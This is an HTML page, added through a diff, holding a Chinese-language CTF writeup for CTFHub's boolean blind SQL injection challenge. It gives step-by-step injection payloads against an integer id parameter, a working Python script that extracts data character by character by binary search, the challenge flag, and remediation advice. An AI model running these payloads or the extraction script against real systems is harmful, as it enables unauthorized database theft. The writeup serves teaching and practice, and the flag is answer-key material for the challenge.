@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 布尔盲注 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; line-height: 1.6; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - SQL注入 - 布尔盲注</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># SQL注入</span>
+            <span class="tag"># 布尔盲注</span>
+            <span class="tag"># 二分法</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>布尔盲注</li>
+            <li><strong>题目方向：</strong>Web - SQL注入</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>根据页面返回的成功或失败状态构造布尔条件，逐字符提取 flag。</li>
+        </ul>
+
+        <h2>二、判断注入类型</h2>
+        <p>页面提供 <code>id</code> 查询参数，并直接回显服务端执行的 SQL 语句。提交 <code>id=1</code> 时显示：</p>
+        <pre>select * from news where id=1
+query_success</pre>
+        <p>参数没有单引号包裹，属于整数型注入点。继续提交真、假两个条件：</p>
+        <pre>id=1 and 1=1
+select * from news where id=1 and 1=1
+query_success
+
+id=1 and 1=2
+select * from news where id=1 and 1=2
+query_error</pre>
+        <p>页面虽然不直接返回查询结果，但会根据 SQL 条件是否成立返回 <code>query_success</code> 或 <code>query_error</code>，因此可以把返回状态当作布尔判断条件。</p>
+
+        <h2>三、确认数据库结构</h2>
+        <p>先验证当前数据库名称。以下条件返回 <code>query_success</code>，说明数据库名为 <code>sqli</code>：</p>
+        <pre>id=1 and database()='sqli'</pre>
+        <p>通过 <code>information_schema.tables</code> 判断名为 <code>flag</code> 的表是否存在：</p>
+        <pre>id=1 and (select count(*)
+from information_schema.tables
+where table_schema=database()
+and table_name='flag')&gt;0</pre>
+        <p>继续判断 <code>flag</code> 表中是否存在同名字段：</p>
+        <pre>id=1 and (select count(*)
+from information_schema.columns
+where table_schema=database()
+and table_name='flag'
+and column_name='flag')&gt;0</pre>
+        <p>两次查询均返回 <code>query_success</code>，目标数据位于 <code>sqli.flag.flag</code>。</p>
+
+        <h2>四、确定 Flag 长度</h2>
+        <p>使用 <code>length()</code> 获取目标字段值长度：</p>
+        <pre>id=1 and length((select flag from flag limit 0,1))=32</pre>
+        <p>条件成立，因此 flag 共 32 个字符。未知长度时也可以通过 <code>length(...) &gt; n</code> 逐步二分或倍增确定。</p>
+
+        <h2>五、逐字符构造布尔条件</h2>
+        <p>使用 <code>substring()</code> 截取指定位置的字符，再通过 <code>ascii()</code> 转为 ASCII 码进行判断。下面条件用于验证第 1 个字符的 ASCII 码是否为 99，即字符 <code>c</code>：</p>
+        <pre>id=1 and ascii(substring((select flag from flag limit 0,1),1,1))=99</pre>
+        <p>进一步使用大于等于条件进行二分查找：</p>
+        <pre>id=1 and (ascii(substring((select flag from flag limit 0,1),1,1))&gt;=99)</pre>
+        <p class="note">ASCII 可视字符通常位于 32 至 126 之间。每次测试区间中点，根据 <code>query_success</code> 或 <code>query_error</code> 收缩范围，最多 7 次请求即可确定一个字符。</p>
+
+        <h2>六、自动化提取脚本</h2>
+        <p>使用 Python 将布尔判断封装为 <code>oracle()</code>，再对长度和每个字符执行二分查找：</p>
+        <pre>import requests
+
+URL = "http://target/"
+EXPR = "(select flag from flag limit 0,1)"
+session = requests.Session()
+
+def oracle(condition):
+    payload = f"1 and ({condition})"
+    response = session.get(URL, params={"id": payload}, timeout=10)
+    return "query_success" in response.text
+
+def get_length():
+    low, high = 1, 128
+    while low &lt; high:
+        mid = (low + high) // 2
+        if oracle(f"length({EXPR})&gt;={mid}"):
+            low = mid + 1
+        else:
+            high = mid
+    return low - 1
+
+def get_char(pos):
+    low, high = 1, 128
+    while low &lt; high:
+        mid = (low + high) // 2
+        condition = f"ascii(substring({EXPR},{pos},1))&gt;={mid}"
+        if oracle(condition):
+            low = mid + 1
+        else:
+            high = mid
+    return chr(low - 1)
+
+length = get_length()
+flag = "".join(get_char(pos) for pos in range(1, length + 1))
+print(flag)</pre>
+        <p>脚本提取结果：</p>
+        <pre>ctfhub{f56000b70d6b7fb240e25b4e}</pre>
+
+        <h2>七、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{f56000b70d6b7fb240e25b4e}
+        </div>
+
+        <h2>八、修复建议</h2>
+        <ul>
+            <li>使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。</li>
+            <li>对 <code>id</code> 等参数执行严格的数据类型校验，只允许合法的整数输入。</li>
+            <li>统一真假条件下的页面响应，避免业务状态成为可区分的布尔侧信道。</li>
+            <li>数据库账号遵循最小权限原则，限制对 <code>information_schema</code> 和业务表的访问能力。</li>
+        </ul>
+
+        <h2>九、解题总结</h2>
+        <p>布尔盲注不会在页面中直接回显查询结果，而是通过响应差异泄露一个比特的信息。本题将 <code>query_success</code> 与 <code>query_error</code> 作为真假分支，配合 <code>length()</code>、<code>substring()</code> 和 <code>ascii()</code> 逐字符提取 flag；使用二分法后，每个字符最多只需 7 次请求。实际开发中应使用参数化查询，并避免在响应中暴露可被利用的条件差异。</p>
+    </div>
+</body>
+</html>
